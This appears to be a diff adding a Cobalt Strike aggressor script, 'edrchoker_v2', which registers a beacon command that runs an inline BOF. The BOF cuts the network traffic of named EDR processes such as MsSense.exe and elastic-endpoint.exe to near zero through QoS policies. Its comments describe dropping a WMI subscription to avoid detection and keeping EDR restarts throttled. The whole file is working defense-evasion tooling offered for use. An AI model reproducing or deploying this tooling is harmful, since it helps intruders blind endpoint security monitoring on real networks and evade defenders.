@@ -1,0 +1,68 @@
+# edrchoker_v2.cna — no WMI subscription (lower detection profile)
+#
+# Usage:
+#   edrchoker_v2 add        "proc1.exe;proc2.exe"   throttle processes
+#   edrchoker_v2 remove     "proc1.exe;proc2.exe"   restore specific processes
+#   edrchoker_v2 remove_all                         restore all QoS policies
+#   edrchoker_v2 list                               show active policies
+#
+# vs v1: WMI subscription watchdog removed.
+# QoS policy matches by process name (AppPathNameMatchCondition), not PID —
+# EDR restarts are automatically throttled without a watchdog.
+
+alias edrchoker_v2 {
+    local('$bof $args $bid $handle $path $cmd $procs');
+    $bid = $1;
+    $cmd = $2;
+
+    if ($cmd is $null || $cmd eq "") {
+        berror($bid, "[edrchoker_v2] usage: edrchoker_v2 <add|remove|remove_all|list> [procs]");
+        return;
+    }
+
+    $procs = "";
+
+    if ($cmd eq "add" || $cmd eq "remove") {
+        if (size(@_) < 3 || $3 eq "") {
+            berror($bid, "[edrchoker_v2] " . $cmd . " requires a process list: \"proc1.exe;proc2.exe\"");
+            return;
+        }
+        $procs = $3;
+    }
+
+    $path   = script_resource("edrchoker_v2.x64.o");
+    $handle = openf($path);
+    if ($handle is $null) { berror($bid, "[edrchoker_v2] cannot open BOF"); return; }
+    $bof = readb($handle, 1048576);
+    closef($handle);
+    if ($bof is $null) { berror($bid, "[edrchoker_v2] readb failed"); return; }
+
+    if ($procs ne "") {
+        btask($bid, "EDRChoker v2: " . $cmd . " " . $procs);
+    } else {
+        btask($bid, "EDRChoker v2: " . $cmd);
+    }
+
+    $args = bof_pack($bid, "zz", $cmd, $procs);
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+beacon_command_register(
+    "edrchoker_v2",
+    "Throttle EDR processes to ~0 bps via QoS pacer.sys (no WMI subscription)",
+    "Usage:\n" .
+    "  edrchoker_v2 add        \"p1.exe;p2.exe\"   throttle processes\n" .
+    "  edrchoker_v2 remove     \"p1.exe;p2.exe\"   restore network for specific processes\n" .
+    "  edrchoker_v2 remove_all                   restore ALL QoS policies\n" .
+    "  edrchoker_v2 list                         show active policies\n\n" .
+    "vs v1:\n" .
+    "  No WMI subscription — eliminates T1546.003 detection vector.\n" .
+    "  QoS policy persists by name-match: EDR restarts still throttled.\n\n" .
+    "Examples:\n" .
+    "  edrchoker_v2 add    \"MsSense.exe;elastic-endpoint.exe\"\n" .
+    "  edrchoker_v2 remove \"MsSense.exe\"\n" .
+    "  edrchoker_v2 remove_all\n" .
+    "  edrchoker_v2 list\n\n" .
+    "Verify:\n" .
+    "  Get-WmiObject -Ns ROOT\\StandardCimv2 -Class MSFT_NetQosPolicySettingData"
+);
